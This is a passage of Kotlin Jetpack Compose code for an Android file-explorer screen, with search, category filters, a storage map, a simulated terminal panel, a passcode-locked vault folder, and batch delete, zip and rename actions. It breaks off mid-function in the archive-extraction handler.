package com.example.ui.screens

import android.content.Context
import androidx.compose.animation.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.grid.GridCells
import androidx.compose.foundation.lazy.grid.LazyVerticalGrid
import androidx.compose.foundation.lazy.grid.items
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.ui.graphics.Brush
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.text.KeyboardActions
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.ImeAction
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.utils.ZipUtils
import com.example.security.SecurityState
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

// --- File Info Class ---
data class FileItem(
    val name: String,
    val file: File,
    val isDirectory: Boolean,
    val size: Long,
    val lastModified: Long,
    val category: FileCategory
)

enum class FileCategory {
    ALL, DOCUMENT, IMAGE, ZIP, TEMP, BACKUP
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ExplorerScreen(modifier: Modifier = Modifier) {
    val context = LocalContext.current
    val filesDir = remember { context.filesDir }

    // State
    var currentDir by remember { mutableStateOf(filesDir) }
    var fileList by remember { mutableStateOf(emptyList<FileItem>()) }
    var selectedCategory by remember { mutableStateOf(FileCategory.ALL) }
    var searchQuery by remember { mutableStateOf("") }
    val searchHistory = remember { mutableStateListOf("readme", ".zip", "logs", "configs") }
    var selectedFileItem by remember { mutableStateOf<FileItem?>(null) }
    var isBatchMode by remember { mutableStateOf(false) }
    val selectedBatchFiles = remember { mutableStateListOf<FileItem>() }
    
    // Dialog States
    var showCreateFileDialog by remember { mutableStateOf(false) }
    var showCreateFolderDialog by remember { mutableStateOf(false) }
    var newFileName by remember { mutableStateOf("") }
    var showPropertiesDialog by remember { mutableStateOf(false) }
    var zipProgress by remember { mutableStateOf(-1f) }
    var unzipProgress by remember { mutableStateOf(-1f) }
    var showExplanationDialog by remember { mutableStateOf(false) }
    
    // Passcode Vault States
    var showVaultPasscodeDialog by remember { mutableStateOf(false) }
    var pendingDirToOpen by remember { mutableStateOf<File?>(null) }
    var vaultPasscodeInput by remember { mutableStateOf("") }
    var passcodeErrorAlert by remember { mutableStateOf(false) }

    // Terminal Emulator States
    var showTerminal by remember { mutableStateOf(false) }
    var terminalInput by remember { mutableStateOf("") }
    var terminalHistory by remember { mutableStateOf(listOf(
        "OMNIFILE BASH EMULATOR v1.4.2 (Linux/Mac/Windows Compatible)",
        "Type 'help' to see available commands or 'neofetch' for system details.",
        "Current working directory: /data/user/0/com.aistudio.fileoptimizer.kxmptz/files"
    )) }

    // Refresh Files helper
    val refreshFiles = {
        ensureSampleFilesExist(context)
        val files = currentDir.listFiles() ?: emptyArray()
        fileList = files.map { f ->
            val cat = when {
                f.name.endsWith(".zip") || f.name.endsWith(".7z") || f.name.endsWith(".rar") -> FileCategory.ZIP
                f.name.endsWith(".jpg") || f.name.endsWith(".png") || f.name.endsWith(".webp") -> FileCategory.IMAGE
                f.name.endsWith(".tmp") || f.name.endsWith(".log") -> FileCategory.TEMP
                f.name.endsWith(".bak") || f.name.contains("backup") -> FileCategory.BACKUP
                else -> FileCategory.DOCUMENT
            }
            FileItem(f.name, f, f.isDirectory, f.length(), f.lastModified(), cat)
        }.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
    }

    // Initial load
    LaunchedEffect(currentDir) {
        refreshFiles()
    }

    // Filtered lists
    val filteredList = remember(fileList, selectedCategory, searchQuery) {
        fileList.filter {
            (selectedCategory == FileCategory.ALL || it.category == selectedCategory) &&
                    (searchQuery.isEmpty() || it.name.contains(searchQuery, ignoreCase = true))
        }
    }

    val diskMapMetrics = remember(fileList) {
        var docsSize = 0L
        var imagesSize = 0L
        var zipSize = 0L
        var tempSize = 0L
        var backupSize = 0L
        
        fileList.forEach {
            if (!it.isDirectory) {
                when (it.category) {
                    FileCategory.DOCUMENT -> docsSize += it.size
                    FileCategory.IMAGE -> imagesSize += it.size
                    FileCategory.ZIP -> zipSize += it.size
                    FileCategory.TEMP -> tempSize += it.size
                    FileCategory.BACKUP -> backupSize += it.size
                    else -> {}
                }
            }
        }
        val totalAllocated = docsSize + imagesSize + zipSize + tempSize + backupSize
        val freeBytes = maxOf(0L, 512 * 1024 * 1024 - totalAllocated)
        
        listOf(
            Triple("Docs", docsSize, Color(0xFF3B82F6)),
            Triple("Images", imagesSize, Color(0xFF10B981)),
            Triple("Archives", zipSize, Color(0xFFF59E0B)),
            Triple("Temp", tempSize, Color(0xFFF43F5E)),
            Triple("Backups", backupSize, Color(0xFF6366F1)),
            Triple("Free", freeBytes, Color(0xFF475569))
        )
    }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // --- TITLE ---
        Row(
            modifier = Modifier.fillMaxWidth(),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                Icon(
                    imageVector = Icons.Default.FolderOpen,
                    contentDescription = "Explorer Title",
                    tint = Color(0xFFD0BCFF),
                    modifier = Modifier.size(32.dp)
                )
                Column {
                    Text("Secure Directory Sandbox", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
                    Text("Isolated context container, shell, and archiving tools", fontSize = 12.sp, color = MaterialTheme.colorScheme.outline)
                }
            }
            IconButton(
                onClick = { showExplanationDialog = true },
                modifier = Modifier.testTag("explorer_info_button")
            ) {
                Icon(
                    imageVector = Icons.Default.Info,
                    contentDescription = "Information Hub",
                    tint = Color(0xFFCAC4D0)
                )
            }
        }

        // --- SEARCH BAR & TOGGLE ---
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            OutlinedTextField(
                value = searchQuery,
                onValueChange = { searchQuery = it },
                placeholder = { Text("Search files & tools...", fontSize = 14.sp) },
                leadingIcon = { Icon(Icons.Default.Search, contentDescription = "Search") },
                trailingIcon = {
                    if (searchQuery.isNotEmpty()) {
                        IconButton(onClick = { searchQuery = "" }) {
                            Icon(Icons.Default.Close, contentDescription = "Clear")
                        }
                    }
                },
                modifier = Modifier
                    .weight(1f)
                    .height(56.dp)
                    .testTag("explorer_search_input"),
                shape = RoundedCornerShape(12.dp),
                singleLine = true,
                keyboardOptions = KeyboardOptions(imeAction = ImeAction.Search),
                keyboardActions = KeyboardActions(onSearch = {
                    if (searchQuery.trim().isNotEmpty() && !searchHistory.contains(searchQuery.trim())) {
                        searchHistory.add(0, searchQuery.trim())
                    }
                }),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = MaterialTheme.colorScheme.primary,
                    unfocusedBorderColor = MaterialTheme.colorScheme.outline.copy(alpha = 0.5f)
                )
            )

            // Terminal Button
            IconButton(
                onClick = { showTerminal = !showTerminal },
                modifier = Modifier
                    .size(52.dp)
                    .background(
                        if (showTerminal) MaterialTheme.colorScheme.primaryContainer 
                        else MaterialTheme.colorScheme.surfaceVariant,
                        RoundedCornerShape(12.dp)
                    )
                    .testTag("terminal_toggle_button")
            ) {
                Icon(
                    imageVector = Icons.Default.Terminal,
                    contentDescription = "Toggle Bash Terminal",
                    tint = if (showTerminal) MaterialTheme.colorScheme.onPrimaryContainer else MaterialTheme.colorScheme.onSurfaceVariant
                )
            }
        }

        // --- SEARCH HISTORY CHIPS ROW ---
        if (searchHistory.isNotEmpty()) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                Text(
                    text = "History:",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.outline
                )
                
                Row(
                    modifier = Modifier
                        .weight(1f)
                        .horizontalScroll(rememberScrollState()),
                    horizontalArrangement = Arrangement.spacedBy(6.dp)
                ) {
                    searchHistory.forEach { historyQuery ->
                        Row(
                            modifier = Modifier
                                .clip(RoundedCornerShape(12.dp))
                                .background(MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f))
                                .clickable { searchQuery = historyQuery }
                                .padding(horizontal = 8.dp, vertical = 4.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(4.dp)
                        ) {
                            Text(
                                text = historyQuery,
                                fontSize = 11.sp,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                            Icon(
                                imageVector = Icons.Default.Close,
                                contentDescription = "Delete",
                                tint = MaterialTheme.colorScheme.outline,
                                modifier = Modifier
                                    .size(12.dp)
                                    .clickable { searchHistory.remove(historyQuery) }
                            )
                        }
                    }
                }
                
                Text(
                    text = "Clear",
                    fontSize = 11.sp,
                    color = MaterialTheme.colorScheme.primary,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.clickable { searchHistory.clear() }
                )
            }
        }

        if (showTerminal) {
            // --- TERMINAL PANEL ---
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(280.dp)
                    .border(1.dp, MaterialTheme.colorScheme.primary.copy(alpha = 0.4f), RoundedCornerShape(12.dp)),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF0F172A)), // dark slate
                shape = RoundedCornerShape(12.dp)
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(12.dp)
                ) {
                    // Title Bar
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Box(modifier = Modifier.size(10.dp).background(Color(0xFFEF4444), RoundedCornerShape(5.dp)))
                            Box(modifier = Modifier.size(10.dp).background(Color(0xFFF59E0B), RoundedCornerShape(5.dp)))
                            Box(modifier = Modifier.size(10.dp).background(Color(0xFF10B981), RoundedCornerShape(5.dp)))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("bash: terminal emulator", color = Color(0xFF94A3B8), fontSize = 11.sp, fontFamily = FontFamily.Monospace)
                        }
                        IconButton(
                            onClick = { terminalHistory = listOf("OMNIFILE BASH EMULATOR v1.4.2", "Terminal cleared.") },
                            modifier = Modifier.size(24.dp)
                        ) {
                            Icon(Icons.Default.DeleteSweep, contentDescription = "Clear Logs", tint = Color(0xFF64748B), modifier = Modifier.size(16.dp))
                        }
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    // Outputs
                    LazyColumn(
                        modifier = Modifier
                            .weight(1f)
                            .fillMaxWidth(),
                        reverseLayout = true
                    ) {
                        items(terminalHistory.reversed()) { line ->
                            Text(
                                text = line,
                                color = if (line.startsWith("$")) Color(0xFF38BDF8) else if (line.startsWith("Error")) Color(0xFFF87171) else Color(0xFFF1F5F9),
                                fontSize = 12.sp,
                                fontFamily = FontFamily.Monospace,
                                modifier = Modifier.padding(vertical = 2.dp)
                            )
                        }
                    }

                    // Input
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .border(1.dp, Color(0xFF334155), RoundedCornerShape(6.dp))
                            .padding(horizontal = 8.dp, vertical = 2.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text("$ ", color = Color(0xFF38BDF8), fontFamily = FontFamily.Monospace, fontSize = 13.sp, fontWeight = FontWeight.Bold)
                        BasicTextField(
                            value = terminalInput,
                            onValueChange = { terminalInput = it },
                            textStyle = LocalTextStyle.current.copy(color = Color.White, fontFamily = FontFamily.Monospace, fontSize = 13.sp),
                            keyboardOptions = KeyboardOptions(imeAction = ImeAction.Send),
                            keyboardActions = KeyboardActions(onSend = {
                                if (terminalInput.trim().isNotEmpty()) {
                                    val cmd = terminalInput.trim()
                                    terminalHistory = terminalHistory + "$ $cmd"
                                    
                                    // Process Command
                                    val response = processTerminalCommand(cmd, currentDir, context, filesDir) { newDir ->
                                        currentDir = newDir
                                        refreshFiles()
                                    }
                                    terminalHistory = terminalHistory + response
                                    terminalInput = ""
                                    refreshFiles()
                                }
                            }),
                            modifier = Modifier
                                .weight(1f)
                                .padding(4.dp)
                        )
                    }
                }
            }
        } else {
            // --- STANDARD VIEW PANEL ---
            Column(
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                // Category Selector
                Text("Quick Categories", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold)
                LazyVerticalGrid(
                    columns = GridCells.Fixed(3),
                    horizontalArrangement = Arrangement.spacedBy(8.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp),
                    modifier = Modifier.height(84.dp)
                ) {
                    val categories = listOf(
                        Triple(FileCategory.ALL, "All Files", Icons.Default.FolderOpen),
                        Triple(FileCategory.DOCUMENT, "Docs", Icons.Default.Description),
                        Triple(FileCategory.IMAGE, "Images", Icons.Default.Image),
                        Triple(FileCategory.ZIP, "Archives", Icons.Default.Inventory2),
                        Triple(FileCategory.TEMP, "Temp/Logs", Icons.Default.Timer),
                        Triple(FileCategory.BACKUP, "Backups", Icons.Default.SettingsBackupRestore)
                    )
                    items(categories) { (cat, label, icon) ->
                        val isSelected = selectedCategory == cat
                        Row(
                            modifier = Modifier
                                .clip(RoundedCornerShape(8.dp))
                                .background(
                                    if (isSelected) MaterialTheme.colorScheme.primary 
                                    else MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)
                                )
                                .clickable { selectedCategory = cat }
                                .padding(horizontal = 8.dp, vertical = 6.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            Icon(
                                icon,
                                contentDescription = label,
                                tint = if (isSelected) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurfaceVariant,
                                modifier = Modifier.size(16.dp)
                            )
                            Text(
                                text = label,
                                color = if (isSelected) MaterialTheme.colorScheme.onPrimary else MaterialTheme.colorScheme.onSurfaceVariant,
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Medium,
                                maxLines = 1,
                                overflow = TextOverflow.Ellipsis
                            )
                        }
                    }
                }
            }
        }

        // --- DIRECTORY NAVIGATION BAR ---
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(8.dp))
                .background(MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.4f))
                .padding(horizontal = 12.dp, vertical = 8.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(Icons.Default.Folder, contentDescription = "Current path", tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(18.dp))
            Spacer(modifier = Modifier.width(8.dp))
            Text(
                text = currentDir.absolutePath.replace(filesDir.parentFile?.absolutePath ?: "", "~"),
                fontSize = 12.sp,
                fontFamily = FontFamily.Monospace,
                color = MaterialTheme.colorScheme.onSecondaryContainer,
                modifier = Modifier.weight(1f),
                maxLines = 1,
                overflow = TextOverflow.Ellipsis
            )
            if (currentDir != filesDir) {
                IconButton(
                    onClick = {
                        val p = currentDir.parentFile
                        if (p != null && p.absolutePath.startsWith(filesDir.absolutePath)) {
                            if (currentDir.name == "secure_vault") {
                                SecurityState.isVaultLocked.value = true
                                SecurityState.registerAlert("Cryptographic Isolation Vault auto-locked on exit.")
                            }
                            currentDir = p
                        }
                    },
                    modifier = Modifier.size(24.dp)
                ) {
                    Icon(Icons.Default.ArrowBack, contentDescription = "Go Up", modifier = Modifier.size(16.dp))
                }
            }
        }

        // --- PROGRESS BARS ---
        if (zipProgress >= 0f) {
            Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                Text("Compressing... ${(zipProgress * 100).toInt()}%", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                LinearProgressIndicator(progress = { zipProgress }, modifier = Modifier.fillMaxWidth())
            }
        }
        if (unzipProgress >= 0f) {
            Column(verticalArrangement = Arrangement.spacedBy(4.dp)) {
                Text("Extracting... ${(unzipProgress * 100).toInt()}%", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                LinearProgressIndicator(progress = { unzipProgress }, modifier = Modifier.fillMaxWidth())
            }
        }

        // --- ACTIONS ROW ---
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Button(
                onClick = { showCreateFileDialog = true },
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier.weight(1f).testTag("create_file_btn"),
                contentPadding = PaddingValues(vertical = 10.dp)
            ) {
                Icon(Icons.Default.NoteAdd, contentDescription = "New File", modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("New File", fontSize = 12.sp)
            }
            Button(
                onClick = { showCreateFolderDialog = true },
                shape = RoundedCornerShape(8.dp),
                colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary),
                modifier = Modifier.weight(1f).testTag("create_folder_btn"),
                contentPadding = PaddingValues(vertical = 10.dp)
            ) {
                Icon(Icons.Default.CreateNewFolder, contentDescription = "New Folder", modifier = Modifier.size(16.dp))
                Spacer(modifier = Modifier.width(6.dp))
                Text("New Dir", fontSize = 12.sp)
            }
        }

        // --- DYNAMIC DISK MAP CARD ---
        val totalDiskAllocated = diskMapMetrics.map { it.second }.sum()
        if (totalDiskAllocated > 0L) {
            Card(
                modifier = Modifier.fillMaxWidth(),
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.25f)),
                border = BorderStroke(1.dp, MaterialTheme.colorScheme.outline.copy(alpha = 0.15f))
            ) {
                Column(modifier = Modifier.padding(12.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Icon(Icons.Default.PieChart, contentDescription = null, tint = MaterialTheme.colorScheme.primary, modifier = Modifier.size(16.dp))
                            Text("Interactive Storage Disk Map", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold, fontSize = 13.sp)
                        }
                        Text("Limit: 512 MB", fontSize = 11.sp, color = MaterialTheme.colorScheme.outline)
                    }
                    
                    // Stacked multi-segment bar
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(16.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .background(MaterialTheme.colorScheme.surface)
                    ) {
                        diskMapMetrics.forEach { (label, size, color) ->
                            val weight = if (totalDiskAllocated > 0) size.toFloat() / totalDiskAllocated else 0f
                            if (weight > 0.01f) {
                                Box(
                                    modifier = Modifier
                                        .fillMaxHeight()
                                        .weight(weight)
                                        .background(color)
                                        .clickable {
                                            val categoryMapped = when (label) {
                                                "Docs" -> FileCategory.DOCUMENT
                                                "Images" -> FileCategory.IMAGE
                                                "Archives" -> FileCategory.ZIP
                                                "Temp" -> FileCategory.TEMP
                                                "Backups" -> FileCategory.BACKUP
                                                else -> FileCategory.ALL
                                            }
                                            selectedCategory = categoryMapped
                                        }
                                )
                            }
                        }
                    }
                    
                    // Category Legends
                    Column(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                        val chunked = diskMapMetrics.chunked(3)
                        chunked.forEach { rowMetrics ->
                            Row(
                                modifier = Modifier.fillMaxWidth(),
                                horizontalArrangement = Arrangement.spacedBy(8.dp)
                            ) {
                                rowMetrics.forEach { (label, size, color) ->
                                    Row(
                                        verticalAlignment = Alignment.CenterVertically,
                                        horizontalArrangement = Arrangement.spacedBy(4.dp),
                                        modifier = Modifier
                                            .weight(1f)
                                            .clip(RoundedCornerShape(4.dp))
                                            .clickable {
                                                val categoryMapped = when (label) {
                                                    "Docs" -> FileCategory.DOCUMENT
                                                    "Images" -> FileCategory.IMAGE
                                                    "Archives" -> FileCategory.ZIP
                                                    "Temp" -> FileCategory.TEMP
                                                    "Backups" -> FileCategory.BACKUP
                                                    else -> FileCategory.ALL
                                                }
                                                selectedCategory = categoryMapped
                                            }
                                            .padding(horizontal = 4.dp, vertical = 2.dp)
                                    ) {
                                        Box(modifier = Modifier.size(8.dp).background(color, CircleShape))
                                        Text(label, fontSize = 10.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                        Spacer(modifier = Modifier.weight(1f))
                                        Text(formatSize(size), fontSize = 9.sp, color = MaterialTheme.colorScheme.outline, maxLines = 1)
                                    }
                                }
                                repeat(3 - rowMetrics.size) {
                                    Spacer(modifier = Modifier.weight(1f))
                                }
                            }
                        }
                    }
                }
            }
        }

        // --- FILE LIST ---
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text("Contents (${filteredList.size})", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold)
            
            // Batch Mode Toggle
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(6.dp),
                modifier = Modifier
                    .clip(RoundedCornerShape(8.dp))
                    .clickable {
                        isBatchMode = !isBatchMode
                        selectedBatchFiles.clear()
                    }
                    .background(if (isBatchMode) MaterialTheme.colorScheme.primaryContainer else Color.Transparent)
                    .padding(horizontal = 8.dp, vertical = 4.dp)
                    .testTag("batch_mode_toggle")
            ) {
                Icon(
                    imageVector = if (isBatchMode) Icons.Default.LibraryAddCheck else Icons.Default.Rule,
                    contentDescription = "Toggle Batch Mode",
                    tint = if (isBatchMode) MaterialTheme.colorScheme.onPrimaryContainer else MaterialTheme.colorScheme.primary,
                    modifier = Modifier.size(16.dp)
                )
                Text(
                    text = "Batch Mode",
                    fontSize = 11.sp,
                    fontWeight = FontWeight.Bold,
                    color = if (isBatchMode) MaterialTheme.colorScheme.onPrimaryContainer else MaterialTheme.colorScheme.primary
                )
            }
        }

        // --- BATCH PROCESSING CONTROL PANEL ---
        if (isBatchMode && selectedBatchFiles.isNotEmpty()) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .animateContentSize(),
                shape = RoundedCornerShape(12.dp),
                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.primaryContainer),
                border = BorderStroke(1.dp, MaterialTheme.colorScheme.primary.copy(alpha = 0.5f))
            ) {
                Column(
                    modifier = Modifier.padding(12.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                            Icon(Icons.Default.Build, contentDescription = null, tint = MaterialTheme.colorScheme.onPrimaryContainer, modifier = Modifier.size(16.dp))
                            Text(
                                text = "Batch Processor (${selectedBatchFiles.size} selected)",
                                fontWeight = FontWeight.Bold,
                                fontSize = 13.sp,
                                color = MaterialTheme.colorScheme.onPrimaryContainer
                            )
                        }
                        TextButton(
                            onClick = { selectedBatchFiles.clear() },
                            contentPadding = PaddingValues(0.dp),
                            modifier = Modifier.height(24.dp)
                        ) {
                            Text("Deselect All", fontSize = 11.sp, color = MaterialTheme.colorScheme.onPrimaryContainer, fontWeight = FontWeight.Bold)
                        }
                    }
                    
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Action 1: Bulk Delete / Wipe
                        Button(
                            onClick = {
                                selectedBatchFiles.forEach { it.file.deleteRecursively() }
                                selectedBatchFiles.clear()
                                refreshFiles()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.weight(1f).testTag("batch_bulk_wipe"),
                            contentPadding = PaddingValues(vertical = 8.dp)
                        ) {
                            Icon(Icons.Default.DeleteForever, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Wipe Bulk", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                        
                        // Action 2: Bulk Compress
                        Button(
                            onClick = {
                                val dest = File(currentDir, "batch_archive_${System.currentTimeMillis() / 1000}.zip")
                                zipProgress = 0f
                                Thread {
                                    try {
                                        val zipOut = java.util.zip.ZipOutputStream(java.io.FileOutputStream(dest))
                                        val totalFiles = selectedBatchFiles.size
                                        selectedBatchFiles.forEachIndexed { index, item ->
                                            if (item.file.isFile) {
                                                java.io.FileInputStream(item.file).use { fis ->
                                                    val zipEntry = java.util.zip.ZipEntry(item.name)
                                                    zipOut.putNextEntry(zipEntry)
                                                    val bytes = ByteArray(4096)
                                                    var length: Int
                                                    while (fis.read(bytes).also { length = it } >= 0) {
                                                        zipOut.write(bytes, 0, length)
                                                    }
                                                    zipOut.closeEntry()
                                                }
                                            }
                                            zipProgress = (index + 1).toFloat() / totalFiles
                                            Thread.sleep(150)
                                        }
                                        zipOut.close()
                                    } catch (e: Exception) {
                                        e.printStackTrace()
                                    } finally {
                                        zipProgress = -1f
                                        selectedBatchFiles.clear()
                                        refreshFiles()
                                    }
                                }.start()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.weight(1f).testTag("batch_bulk_zip"),
                            contentPadding = PaddingValues(vertical = 8.dp)
                        ) {
                            Icon(Icons.Default.Archive, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Zip Bulk", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                        
                        // Action 3: Bulk Prefix Rename
                        Button(
                            onClick = {
                                selectedBatchFiles.forEach { item ->
                                    val parent = item.file.parentFile
                                    if (parent != null) {
                                        val newFile = File(parent, "optimized_${item.name}")
                                        item.file.renameTo(newFile)
                                    }
                                }
                                selectedBatchFiles.clear()
                                refreshFiles()
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.secondary),
                            shape = RoundedCornerShape(8.dp),
                            modifier = Modifier.weight(1f).testTag("batch_bulk_rename"),
                            contentPadding = PaddingValues(vertical = 8.dp)
                        ) {
                            Icon(Icons.Default.DriveFileRenameOutline, contentDescription = null, modifier = Modifier.size(14.dp))
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("Rename Bulk", fontSize = 10.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
        
        if (filteredList.isEmpty()) {
            Box(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxWidth()
                    .border(1.dp, MaterialTheme.colorScheme.outline.copy(alpha = 0.2f), RoundedCornerShape(12.dp))
                    .padding(24.dp),
                contentAlignment = Alignment.Center
            ) {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Icon(Icons.Default.FolderOpen, contentDescription = "Empty", tint = MaterialTheme.colorScheme.outline, modifier = Modifier.size(48.dp))
                    Text("No files in this directory", color = MaterialTheme.colorScheme.outline, fontSize = 14.sp)
                    TextButton(onClick = { refreshFiles() }) {
                        Text("Regenerate Demo Files")
                    }
                }
            }
        } else {
            LazyColumn(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                items(filteredList) { item ->
                    FileRowItem(
                        item = item,
                        isBatchMode = isBatchMode,
                        isSelected = selectedBatchFiles.contains(item),
                        onClick = {
                            if (isBatchMode) {
                                if (selectedBatchFiles.contains(item)) {
                                    selectedBatchFiles.remove(item)
                                } else {
                                    selectedBatchFiles.add(item)
                                }
                            } else {
                                if (item.isDirectory) {
                                    if (item.name == "secure_vault" && SecurityState.isVaultLocked.value) {
                                        pendingDirToOpen = item.file
                                        showVaultPasscodeDialog = true
                                    } else {
                                        currentDir = item.file
                                    }
                                } else {
                                    selectedFileItem = item
                                    showPropertiesDialog = true
                                }
                            }
                        },
                        onCompress = {
                            val dest = File(currentDir, "${item.name.substringBeforeLast(".")}.zip")
                            zipProgress = 0f
                            Thread {
                                try {
                                    ZipUtils.compressFileOrFolder(item.file, dest) { progress ->
                                        zipProgress = progress
                                    }
                                } catch (e: Exception) {
                                    e.printStackTrace()
                                } finally {
                                    zipProgress = -1f
                                    refreshFiles()
                                }
                            }.start()
                        },
                        onExtract = {
                            val destName = item.name.substringBeforeLast(".zip")
                            val dest = File(currentDir, if (destName.isNotEmpty()) destName else "extracted_contents")
                            unzipProgress = 0f
                            Thread {
